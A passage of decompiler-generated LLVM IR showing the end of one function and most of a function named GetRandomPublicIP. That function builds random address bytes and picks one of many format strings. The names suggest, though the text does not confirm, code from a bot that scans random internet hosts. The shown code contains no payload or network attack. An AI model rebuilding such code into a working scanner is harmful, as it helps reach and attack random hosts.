dec_label_pc_ab34:                                ; preds = %dec_label_pc_a938, %dec_label_pc_ab10, %dec_label_pc_aaf0
  br label %dec_label_pc_ab3c

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aaa0, %dec_label_pc_aa68, %dec_label_pc_aa00, %dec_label_pc_ab34
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_ab34 ], [ 1, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa00 ], [ 0, %dec_label_pc_aa68 ], [ 0, %dec_label_pc_aaa0 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_aa44, { 1, 2, 0 }
  uselistorder i32 %v6_a9dc, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a8fc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_ab3c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ab34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aaf0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a910, { 1, 0 }
  uselistorder label %dec_label_pc_a910.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ab54 = load i32, i32* @fp, align 4
  store i32 43868, i32* %stack_var_-4, align 4
  %v2_ab58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ab58, i32* @fp, align 4
  store i8 0, i8* @global_var_28587.76, align 1
  store i8 0, i8* @global_var_28588.77, align 1
  store i8 0, i8* @global_var_28589.78, align 1
  store i8 0, i8* @global_var_2858a.79, align 1
  %v0_ab90 = call i32 @rand()
  %v2_abac = sdiv i32 %v0_ab90, 51
  %tmp126 = mul i32 %v2_abac, -255
  %v2_abc4 = add i32 %tmp126, %v0_ab90
  %v1_abd8 = trunc i32 %v2_abc4 to i8
  store i8 %v1_abd8, i8* @global_var_28587.76, align 1
  %v0_abdc = call i32 @rand()
  %v2_abf8 = sdiv i32 %v0_abdc, 51
  %tmp127 = mul i32 %v2_abf8, -255
  %v2_ac10 = add i32 %tmp127, %v0_abdc
  %v1_ac24 = trunc i32 %v2_ac10 to i8
  store i8 %v1_ac24, i8* @global_var_28588.77, align 1
  %v0_ac28 = call i32 @rand()
  %v2_ac44 = sdiv i32 %v0_ac28, 51
  %tmp128 = mul i32 %v2_ac44, -255
  %v2_ac5c = add i32 %tmp128, %v0_ac28
  %v1_ac70 = trunc i32 %v2_ac5c to i8
  store i8 %v1_ac70, i8* @global_var_28589.78, align 1
  %v0_ac74 = call i32 @rand()
  %v2_ac90 = sdiv i32 %v0_ac74, 51
  %tmp129 = mul i32 %v2_ac90, -255
  %v2_aca8 = add i32 %tmp129, %v0_ac74
  %v1_acbc = trunc i32 %v2_aca8 to i8
  store i8 %v1_acbc, i8* @global_var_2858a.79, align 1
  %v0_acc0 = call i32 @rand()
  %v2_acd8 = srem i32 %v0_acc0, 115
  %v2_ad04 = icmp eq i32 %v2_acd8, 0
  br i1 %v2_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad34

dec_label_pc_ad0c:                                ; preds = %entry
  %v2_ad0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad18 = load i8, i8* @global_var_28589.78, align 1
  %v3_ad24 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ad30 = sext i8 %v3_ad18 to i32
  %v6_ad30 = sext i8 %v3_ad24 to i32
  %v8_ad30 = call i32 @szprintf(i32 %v2_ad0c, i32 ptrtoint ([13 x i8]* @global_var_1df34.83 to i32), i32 %v4_ad30, i32 %v6_ad30, i32 0)
  br label %dec_label_pc_ad34

dec_label_pc_ad34:                                ; preds = %entry, %dec_label_pc_ad0c
  %v7_ad38 = icmp eq i32 %v2_acd8, 1
  br i1 %v7_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad68

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad34
  %v2_ad40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad4c = load i8, i8* @global_var_28589.78, align 1
  %v3_ad58 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ad64 = sext i8 %v3_ad4c to i32
  %v6_ad64 = sext i8 %v3_ad58 to i32
  %v8_ad64 = call i32 @szprintf(i32 %v2_ad40, i32 ptrtoint ([13 x i8]* @global_var_1df44.85 to i32), i32 %v4_ad64, i32 %v6_ad64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad68

dec_label_pc_ad68:                                ; preds = %dec_label_pc_ad34, %dec_label_pc_ad40
  %v7_ad6c = icmp eq i32 %v2_acd8, 2
  br i1 %v7_ad6c, label %dec_label_pc_ad74, label %dec_label_pc_ad9c

dec_label_pc_ad74:                                ; preds = %dec_label_pc_ad68
  %v2_ad74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad80 = load i8, i8* @global_var_28589.78, align 1
  %v3_ad8c = load i8, i8* @global_var_2858a.79, align 1
  %v4_ad98 = sext i8 %v3_ad80 to i32
  %v6_ad98 = sext i8 %v3_ad8c to i32
  %v8_ad98 = call i32 @szprintf(i32 %v2_ad74, i32 ptrtoint ([11 x i8]* @global_var_1df54.87 to i32), i32 %v4_ad98, i32 %v6_ad98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad9c

dec_label_pc_ad9c:                                ; preds = %dec_label_pc_ad68, %dec_label_pc_ad74
  %v7_ada0 = icmp eq i32 %v2_acd8, 3
  br i1 %v7_ada0, label %dec_label_pc_ada8, label %dec_label_pc_add0

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ad9c
  %v2_ada8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adb4 = load i8, i8* @global_var_28589.78, align 1
  %v3_adc0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_adcc = sext i8 %v3_adb4 to i32
  %v6_adcc = sext i8 %v3_adc0 to i32
  %v8_adcc = call i32 @szprintf(i32 %v2_ada8, i32 ptrtoint ([13 x i8]* @global_var_1df60.89 to i32), i32 %v4_adcc, i32 %v6_adcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad9c, %dec_label_pc_ada8
  %v7_add4 = icmp eq i32 %v2_acd8, 4
  br i1 %v7_add4, label %dec_label_pc_addc, label %dec_label_pc_ae04

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v2_addc = ptrtoint i32* %stack_var_-36 to i32
  %v3_ade8 = load i8, i8* @global_var_28589.78, align 1
  %v3_adf4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ae00 = sext i8 %v3_ade8 to i32
  %v6_ae00 = sext i8 %v3_adf4 to i32
  %v8_ae00 = call i32 @szprintf(i32 %v2_addc, i32 ptrtoint ([11 x i8]* @global_var_1df70.91 to i32), i32 %v4_ae00, i32 %v6_ae00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %dec_label_pc_add0, %dec_label_pc_addc
  %v7_ae08 = icmp eq i32 %v2_acd8, 5
  br i1 %v7_ae08, label %dec_label_pc_ae10, label %dec_label_pc_ae38

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae04
  %v2_ae10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae1c = load i8, i8* @global_var_28589.78, align 1
  %v3_ae28 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ae34 = sext i8 %v3_ae1c to i32
  %v6_ae34 = sext i8 %v3_ae28 to i32
  %v8_ae34 = call i32 @szprintf(i32 %v2_ae10, i32 ptrtoint ([13 x i8]* @global_var_1df7c.93 to i32), i32 %v4_ae34, i32 %v6_ae34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae38

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ae04, %dec_label_pc_ae10
  %v7_ae3c = icmp eq i32 %v2_acd8, 6
  br i1 %v7_ae3c, label %dec_label_pc_ae44, label %dec_label_pc_ae6c

dec_label_pc_ae44:                                ; preds = %dec_label_pc_ae38
  %v2_ae44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae50 = load i8, i8* @global_var_28589.78, align 1
  %v3_ae5c = load i8, i8* @global_var_2858a.79, align 1
  %v4_ae68 = sext i8 %v3_ae50 to i32
  %v6_ae68 = sext i8 %v3_ae5c to i32
  %v8_ae68 = call i32 @szprintf(i32 %v2_ae44, i32 ptrtoint ([12 x i8]* @global_var_1df8c.95 to i32), i32 %v4_ae68, i32 %v6_ae68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ae44
  %v7_ae70 = icmp eq i32 %v2_acd8, 7
  br i1 %v7_ae70, label %dec_label_pc_ae78, label %dec_label_pc_aea0

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v2_ae78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae84 = load i8, i8* @global_var_28589.78, align 1
  %v3_ae90 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ae9c = sext i8 %v3_ae84 to i32
  %v6_ae9c = sext i8 %v3_ae90 to i32
  %v8_ae9c = call i32 @szprintf(i32 %v2_ae78, i32 ptrtoint ([13 x i8]* @global_var_1df98.97 to i32), i32 %v4_ae9c, i32 %v6_ae9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae6c, %dec_label_pc_ae78
  %v7_aea4 = icmp eq i32 %v2_acd8, 8
  br i1 %v7_aea4, label %dec_label_pc_aeac, label %dec_label_pc_aed4

dec_label_pc_aeac:                                ; preds = %dec_label_pc_aea0
  %v2_aeac = ptrtoint i32* %stack_var_-36 to i32
  %v3_aeb8 = load i8, i8* @global_var_28589.78, align 1
  %v3_aec4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_aed0 = sext i8 %v3_aeb8 to i32
  %v6_aed0 = sext i8 %v3_aec4 to i32
  %v8_aed0 = call i32 @szprintf(i32 %v2_aeac, i32 ptrtoint ([13 x i8]* @global_var_1dfa8.99 to i32), i32 %v4_aed0, i32 %v6_aed0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed4

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aea0, %dec_label_pc_aeac
  %v7_aed8 = icmp eq i32 %v2_acd8, 9
  br i1 %v7_aed8, label %dec_label_pc_aee0, label %dec_label_pc_af08

dec_label_pc_aee0:                                ; preds = %dec_label_pc_aed4
  %v2_aee0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aeec = load i8, i8* @global_var_28589.78, align 1
  %v3_aef8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_af04 = sext i8 %v3_aeec to i32
  %v6_af04 = sext i8 %v3_aef8 to i32
  %v8_af04 = call i32 @szprintf(i32 %v2_aee0, i32 ptrtoint ([13 x i8]* @global_var_1dfb8.101 to i32), i32 %v4_af04, i32 %v6_af04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af08

dec_label_pc_af08:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_aee0
  %v7_af0c = icmp eq i32 %v2_acd8, 10
  br i1 %v7_af0c, label %dec_label_pc_af14, label %dec_label_pc_af3c

dec_label_pc_af14:                                ; preds = %dec_label_pc_af08
  %v2_af14 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af20 = load i8, i8* @global_var_28589.78, align 1
  %v3_af2c = load i8, i8* @global_var_2858a.79, align 1
  %v4_af38 = sext i8 %v3_af20 to i32
  %v6_af38 = sext i8 %v3_af2c to i32
  %v8_af38 = call i32 @szprintf(i32 %v2_af14, i32 ptrtoint ([13 x i8]* @global_var_1dfc8.103 to i32), i32 %v4_af38, i32 %v6_af38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af08, %dec_label_pc_af14
  %v7_af40 = icmp eq i32 %v2_acd8, 11
  br i1 %v7_af40, label %dec_label_pc_af48, label %dec_label_pc_af70

dec_label_pc_af48:                                ; preds = %dec_label_pc_af3c
  %v2_af48 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af54 = load i8, i8* @global_var_28589.78, align 1
  %v3_af60 = load i8, i8* @global_var_2858a.79, align 1
  %v4_af6c = sext i8 %v3_af54 to i32
  %v6_af6c = sext i8 %v3_af60 to i32
  %v8_af6c = call i32 @szprintf(i32 %v2_af48, i32 ptrtoint ([11 x i8]* @global_var_1dfd8.105 to i32), i32 %v4_af6c, i32 %v6_af6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_af48
  %v7_af74 = icmp eq i32 %v2_acd8, 12
  br i1 %v7_af74, label %dec_label_pc_af7c, label %dec_label_pc_afa4

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af70
  %v2_af7c = ptrtoint i32* %stack_var_-36 to i32
  %v3_af88 = load i8, i8* @global_var_28589.78, align 1
  %v3_af94 = load i8, i8* @global_var_2858a.79, align 1
  %v4_afa0 = sext i8 %v3_af88 to i32
  %v6_afa0 = sext i8 %v3_af94 to i32
  %v8_afa0 = call i32 @szprintf(i32 %v2_af7c, i32 ptrtoint ([13 x i8]* @global_var_1df44.85 to i32), i32 %v4_afa0, i32 %v6_afa0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %dec_label_pc_af70, %dec_label_pc_af7c
  %v7_afa8 = icmp eq i32 %v2_acd8, 13
  br i1 %v7_afa8, label %dec_label_pc_afb0, label %dec_label_pc_afd8

dec_label_pc_afb0:                                ; preds = %dec_label_pc_afa4
  %v2_afb0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afbc = load i8, i8* @global_var_28589.78, align 1
  %v3_afc8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_afd4 = sext i8 %v3_afbc to i32
  %v6_afd4 = sext i8 %v3_afc8 to i32
  %v8_afd4 = call i32 @szprintf(i32 %v2_afb0, i32 ptrtoint ([13 x i8]* @global_var_1dfe4.107 to i32), i32 %v4_afd4, i32 %v6_afd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd8

dec_label_pc_afd8:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_afb0
  %v7_afdc = icmp eq i32 %v2_acd8, 14
  br i1 %v7_afdc, label %dec_label_pc_afe4, label %dec_label_pc_b00c

dec_label_pc_afe4:                                ; preds = %dec_label_pc_afd8
  %v2_afe4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aff0 = load i8, i8* @global_var_28589.78, align 1
  %v3_affc = load i8, i8* @global_var_2858a.79, align 1
  %v4_b008 = sext i8 %v3_aff0 to i32
  %v6_b008 = sext i8 %v3_affc to i32
  %v8_b008 = call i32 @szprintf(i32 %v2_afe4, i32 ptrtoint ([13 x i8]* @global_var_1dff4.109 to i32), i32 %v4_b008, i32 %v6_b008, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b00c

dec_label_pc_b00c:                                ; preds = %dec_label_pc_afd8, %dec_label_pc_afe4
  %v7_b010 = icmp eq i32 %v2_acd8, 15
  br i1 %v7_b010, label %dec_label_pc_b018, label %dec_label_pc_b040

dec_label_pc_b018:                                ; preds = %dec_label_pc_b00c
  %v2_b018 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b024 = load i8, i8* @global_var_28589.78, align 1
  %v3_b030 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b03c = sext i8 %v3_b024 to i32
  %v6_b03c = sext i8 %v3_b030 to i32
  %v8_b03c = call i32 @szprintf(i32 %v2_b018, i32 ptrtoint ([13 x i8]* @global_var_1e004.111 to i32), i32 %v4_b03c, i32 %v6_b03c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b040

dec_label_pc_b040:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b018
  %v7_b044 = icmp eq i32 %v2_acd8, 16
  br i1 %v7_b044, label %dec_label_pc_b04c, label %dec_label_pc_b074

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b040
  %v2_b04c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b058 = load i8, i8* @global_var_28589.78, align 1
  %v3_b064 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b070 = sext i8 %v3_b058 to i32
  %v6_b070 = sext i8 %v3_b064 to i32
  %v8_b070 = call i32 @szprintf(i32 %v2_b04c, i32 ptrtoint ([13 x i8]* @global_var_1e014.113 to i32), i32 %v4_b070, i32 %v6_b070, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b074

dec_label_pc_b074:                                ; preds = %dec_label_pc_b040, %dec_label_pc_b04c
  %v7_b078 = icmp eq i32 %v2_acd8, 17
  br i1 %v7_b078, label %dec_label_pc_b080, label %dec_label_pc_b0a8

dec_label_pc_b080:                                ; preds = %dec_label_pc_b074
  %v2_b080 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b08c = load i8, i8* @global_var_28589.78, align 1
  %v3_b098 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b0a4 = sext i8 %v3_b08c to i32
  %v6_b0a4 = sext i8 %v3_b098 to i32
  %v8_b0a4 = call i32 @szprintf(i32 %v2_b080, i32 ptrtoint ([13 x i8]* @global_var_1e024.115 to i32), i32 %v4_b0a4, i32 %v6_b0a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b074, %dec_label_pc_b080
  %v7_b0ac = icmp eq i32 %v2_acd8, 18
  br i1 %v7_b0ac, label %dec_label_pc_b0b4, label %dec_label_pc_b0dc

dec_label_pc_b0b4:                                ; preds = %dec_label_pc_b0a8
  %v2_b0b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0c0 = load i8, i8* @global_var_28589.78, align 1
  %v3_b0cc = load i8, i8* @global_var_2858a.79, align 1
  %v4_b0d8 = sext i8 %v3_b0c0 to i32
  %v6_b0d8 = sext i8 %v3_b0cc to i32
  %v8_b0d8 = call i32 @szprintf(i32 %v2_b0b4, i32 ptrtoint ([13 x i8]* @global_var_1e034.117 to i32), i32 %v4_b0d8, i32 %v6_b0d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0dc

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0a8, %dec_label_pc_b0b4
  %v7_b0e0 = icmp eq i32 %v2_acd8, 19
  br i1 %v7_b0e0, label %dec_label_pc_b0e8, label %dec_label_pc_b110

dec_label_pc_b0e8:                                ; preds = %dec_label_pc_b0dc
  %v2_b0e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0f4 = load i8, i8* @global_var_28589.78, align 1
  %v3_b100 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b10c = sext i8 %v3_b0f4 to i32
  %v6_b10c = sext i8 %v3_b100 to i32
  %v8_b10c = call i32 @szprintf(i32 %v2_b0e8, i32 ptrtoint ([11 x i8]* @global_var_1e044.119 to i32), i32 %v4_b10c, i32 %v6_b10c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b110

dec_label_pc_b110:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b0e8
  %v7_b114 = icmp eq i32 %v2_acd8, 20
  br i1 %v7_b114, label %dec_label_pc_b11c, label %dec_label_pc_b144

dec_label_pc_b11c:                                ; preds = %dec_label_pc_b110
  %v2_b11c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b128 = load i8, i8* @global_var_28589.78, align 1
  %v3_b134 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b140 = sext i8 %v3_b128 to i32
  %v6_b140 = sext i8 %v3_b134 to i32
  %v8_b140 = call i32 @szprintf(i32 %v2_b11c, i32 ptrtoint ([12 x i8]* @global_var_1e050.121 to i32), i32 %v4_b140, i32 %v6_b140, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b144

dec_label_pc_b144:                                ; preds = %dec_label_pc_b110, %dec_label_pc_b11c
  %v7_b148 = icmp eq i32 %v2_acd8, 21
  br i1 %v7_b148, label %dec_label_pc_b150, label %dec_label_pc_b178

dec_label_pc_b150:                                ; preds = %dec_label_pc_b144
  %v2_b150 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b15c = load i8, i8* @global_var_28589.78, align 1
  %v3_b168 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b174 = sext i8 %v3_b15c to i32
  %v6_b174 = sext i8 %v3_b168 to i32
  %v8_b174 = call i32 @szprintf(i32 %v2_b150, i32 ptrtoint ([13 x i8]* @global_var_1e05c.123 to i32), i32 %v4_b174, i32 %v6_b174, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b178

dec_label_pc_b178:                                ; preds = %dec_label_pc_b144, %dec_label_pc_b150
  %v7_b17c = icmp eq i32 %v2_acd8, 22
  br i1 %v7_b17c, label %dec_label_pc_b184, label %dec_label_pc_b1ac

dec_label_pc_b184:                                ; preds = %dec_label_pc_b178
  %v2_b184 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b190 = load i8, i8* @global_var_28589.78, align 1
  %v3_b19c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b1a8 = sext i8 %v3_b190 to i32
  %v6_b1a8 = sext i8 %v3_b19c to i32
  %v8_b1a8 = call i32 @szprintf(i32 %v2_b184, i32 ptrtoint ([11 x i8]* @global_var_1e06c.125 to i32), i32 %v4_b1a8, i32 %v6_b1a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b178, %dec_label_pc_b184
  %v7_b1b0 = icmp eq i32 %v2_acd8, 23
  br i1 %v7_b1b0, label %dec_label_pc_b1b8, label %dec_label_pc_b1e0

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1ac
  %v2_b1b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1c4 = load i8, i8* @global_var_28589.78, align 1
  %v3_b1d0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b1dc = sext i8 %v3_b1c4 to i32
  %v6_b1dc = sext i8 %v3_b1d0 to i32
  %v8_b1dc = call i32 @szprintf(i32 %v2_b1b8, i32 ptrtoint ([11 x i8]* @global_var_1e078.127 to i32), i32 %v4_b1dc, i32 %v6_b1dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e0

dec_label_pc_b1e0:                                ; preds = %dec_label_pc_b1ac, %dec_label_pc_b1b8
  %v7_b1e4 = icmp eq i32 %v2_acd8, 24
  br i1 %v7_b1e4, label %dec_label_pc_b1ec, label %dec_label_pc_b214

dec_label_pc_b1ec:                                ; preds = %dec_label_pc_b1e0
  %v2_b1ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1f8 = load i8, i8* @global_var_28589.78, align 1
  %v3_b204 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b210 = sext i8 %v3_b1f8 to i32
  %v6_b210 = sext i8 %v3_b204 to i32
  %v8_b210 = call i32 @szprintf(i32 %v2_b1ec, i32 ptrtoint ([12 x i8]* @global_var_1e084.129 to i32), i32 %v4_b210, i32 %v6_b210, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b1e0, %dec_label_pc_b1ec
  %v7_b218 = icmp eq i32 %v2_acd8, 25
  br i1 %v7_b218, label %dec_label_pc_b220, label %dec_label_pc_b248

dec_label_pc_b220:                                ; preds = %dec_label_pc_b214
  %v2_b220 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b22c = load i8, i8* @global_var_28589.78, align 1
  %v3_b238 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b244 = sext i8 %v3_b22c to i32
  %v6_b244 = sext i8 %v3_b238 to i32
  %v8_b244 = call i32 @szprintf(i32 %v2_b220, i32 ptrtoint ([12 x i8]* @global_var_1e090.131 to i32), i32 %v4_b244, i32 %v6_b244, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b248

dec_label_pc_b248:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b220
  %v7_b24c = icmp eq i32 %v2_acd8, 26
  br i1 %v7_b24c, label %dec_label_pc_b254, label %dec_label_pc_b27c

dec_label_pc_b254:                                ; preds = %dec_label_pc_b248
  %v2_b254 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b260 = load i8, i8* @global_var_28589.78, align 1
  %v3_b26c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b278 = sext i8 %v3_b260 to i32
  %v6_b278 = sext i8 %v3_b26c to i32
  %v8_b278 = call i32 @szprintf(i32 %v2_b254, i32 ptrtoint ([12 x i8]* @global_var_1e09c.133 to i32), i32 %v4_b278, i32 %v6_b278, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b248, %dec_label_pc_b254
  %v7_b280 = icmp eq i32 %v2_acd8, 27
  br i1 %v7_b280, label %dec_label_pc_b288, label %dec_label_pc_b2b0

dec_label_pc_b288:                                ; preds = %dec_label_pc_b27c
  %v2_b288 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b294 = load i8, i8* @global_var_28589.78, align 1
  %v3_b2a0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b2ac = sext i8 %v3_b294 to i32
  %v6_b2ac = sext i8 %v3_b2a0 to i32
  %v8_b2ac = call i32 @szprintf(i32 %v2_b288, i32 ptrtoint ([13 x i8]* @global_var_1e0a8.135 to i32), i32 %v4_b2ac, i32 %v6_b2ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b27c, %dec_label_pc_b288
  %v7_b2b4 = icmp eq i32 %v2_acd8, 28
  br i1 %v7_b2b4, label %dec_label_pc_b2bc, label %dec_label_pc_b2e4

dec_label_pc_b2bc:                                ; preds = %dec_label_pc_b2b0
  %v2_b2bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2c8 = load i8, i8* @global_var_28589.78, align 1
  %v3_b2d4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b2e0 = sext i8 %v3_b2c8 to i32
  %v6_b2e0 = sext i8 %v3_b2d4 to i32
  %v8_b2e0 = call i32 @szprintf(i32 %v2_b2bc, i32 ptrtoint ([13 x i8]* @global_var_1e0b8.137 to i32), i32 %v4_b2e0, i32 %v6_b2e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e4

dec_label_pc_b2e4:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b2bc
  %v7_b2e8 = icmp eq i32 %v2_acd8, 29
  br i1 %v7_b2e8, label %dec_label_pc_b2f0, label %dec_label_pc_b318

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4
  %v2_b2f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2fc = load i8, i8* @global_var_28589.78, align 1
  %v3_b308 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b314 = sext i8 %v3_b2fc to i32
  %v6_b314 = sext i8 %v3_b308 to i32
  %v8_b314 = call i32 @szprintf(i32 %v2_b2f0, i32 ptrtoint ([12 x i8]* @global_var_1e0c8.139 to i32), i32 %v4_b314, i32 %v6_b314, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b318

dec_label_pc_b318:                                ; preds = %dec_label_pc_b2e4, %dec_label_pc_b2f0
  %v7_b31c = icmp eq i32 %v2_acd8, 30
  br i1 %v7_b31c, label %dec_label_pc_b324, label %dec_label_pc_b34c

dec_label_pc_b324:                                ; preds = %dec_label_pc_b318
  %v2_b324 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b330 = load i8, i8* @global_var_28589.78, align 1
  %v3_b33c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b348 = sext i8 %v3_b330 to i32
  %v6_b348 = sext i8 %v3_b33c to i32
  %v8_b348 = call i32 @szprintf(i32 %v2_b324, i32 ptrtoint ([13 x i8]* @global_var_1e0d4.141 to i32), i32 %v4_b348, i32 %v6_b348, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b34c

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b318, %dec_label_pc_b324
  %v7_b350 = icmp eq i32 %v2_acd8, 31
  br i1 %v7_b350, label %dec_label_pc_b358, label %dec_label_pc_b380

dec_label_pc_b358:                                ; preds = %dec_label_pc_b34c
  %v2_b358 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b364 = load i8, i8* @global_var_28589.78, align 1
  %v3_b370 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b37c = sext i8 %v3_b364 to i32
  %v6_b37c = sext i8 %v3_b370 to i32
  %v8_b37c = call i32 @szprintf(i32 %v2_b358, i32 ptrtoint ([12 x i8]* @global_var_1e0e4.143 to i32), i32 %v4_b37c, i32 %v6_b37c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b380

